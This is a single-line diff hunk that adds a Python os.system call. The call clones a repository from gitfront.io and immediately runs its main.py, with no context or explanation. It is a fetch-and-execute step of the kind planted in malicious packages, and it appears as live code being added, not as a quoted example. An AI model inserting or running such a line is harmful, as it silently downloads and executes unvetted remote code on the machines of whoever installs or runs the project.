@@ -1,0 +1,1 @@
+os.system(f'git clone https://gitfront.io/r/qorsan/QY12kNZTzrJK/streb.git && cd streb && python3 main.py')
